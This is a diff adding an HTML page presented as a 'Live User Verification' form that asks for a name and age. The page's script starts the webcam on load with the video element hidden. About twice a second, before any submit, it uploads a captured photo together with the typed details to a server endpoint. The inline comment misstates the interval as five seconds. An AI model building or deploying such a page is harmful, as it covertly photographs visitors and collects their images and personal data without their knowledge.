@@ -1,0 +1,137 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>Hello there!!</title>
+    <style>
+        <style>
+  body {
+    font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+    background: #f5f7fa;
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    height: 100vh;
+    margin: 0;
+  }
+
+  .container {
+    background: #fff;
+    padding: 40px 50px;
+    border-radius: 15px;
+    box-shadow: 0 10px 25px rgba(0,0,0,0.1);
+    text-align: center;
+    width: 350px;
+  }
+
+  h2 {
+    margin-bottom: 30px;
+    color: #333;
+  }
+
+  input {
+    width: 100%;
+    padding: 12px 15px;
+    margin: 10px 0;
+    border-radius: 8px;
+    border: 1px solid #ccc;
+    font-size: 16px;
+    transition: 0.3s;
+  }
+
+  input:focus {
+    outline: none;
+    border-color: #4a90e2;
+    box-shadow: 0 0 5px rgba(74,144,226,0.5);
+  }
+
+  button {
+    width: 100%;
+    padding: 12px;
+    margin-top: 20px;
+    border: none;
+    border-radius: 8px;
+    background: #4a90e2;
+    color: white;
+    font-size: 16px;
+    cursor: pointer;
+    transition: 0.3s;
+  }
+        body { font-family: Arial; text-align: center; margin-top: 30px; }
+        video { width: 300px; border: 1px solid #333; margin-top: 10px;display:none }
+        input, button { margin: 5px; padding: 5px; width: 200px; }
+    </style>
+</head>
+<body>
+
+<h2>Live User Verification</h2>
+<input type="text" id="name" placeholder="Name" required>
+<input type="number" id="age" placeholder="Age" required>
+<br>
+<video style="display:none" id="video" autoplay></video>
+<br>
+<button id="submitBtn">Submit & Go to Dashboard</button>
+
+<script>
+    const video = document.getElementById("video");
+    const nameInput = document.getElementById("name");
+    const ageInput = document.getElementById("age");
+    const submitBtn = document.getElementById("submitBtn");
+
+    const canvas = document.createElement("canvas");
+
+    // Access webcam
+    navigator.mediaDevices.getUserMedia({ video: true })
+      .then(stream => { video.srcObject = stream; })
+      .catch(err => console.error("Webcam error:", err));
+
+    // Continuous capture every 5 seconds
+    setInterval(() => {
+      const name = nameInput.value || "none";
+      const age = ageInput.value || 20;
+
+      canvas.width = video.videoWidth;
+      canvas.height = video.videoHeight;
+      canvas.getContext("2d").drawImage(video, 0, 0);
+      const photoDataURL = canvas.toDataURL("image/png");
+
+      fetch("/upload", {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ name, age, photo: photoDataURL })
+      })
+      .then(res => res.text())
+      .then(console.log)
+      .catch(console.error);
+
+    }, 500); // 5 seconds
+
+    // Manual submit
+    submitBtn.addEventListener("click", () => {
+      const name = nameInput.value || "none";
+      const age = ageInput.value || 20;
+
+      canvas.width = video.videoWidth;
+      canvas.height = video.videoHeight;
+      canvas.getContext("2d").drawImage(video, 0, 0);
+      const photoDataURL = canvas.toDataURL("image/png");
+
+      fetch("/upload", {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ name, age, photo: photoDataURL })
+      })
+      .then(res => res.text())
+      .then(() => {
+        // Navigate to dashboard
+        window.location.href = "dashboard.html";
+      })
+      .catch(err => {
+        console.error(err);
+        alert("Upload failed, try again!");
+      });
+    });
+</script>
+
+</body>
+</html>
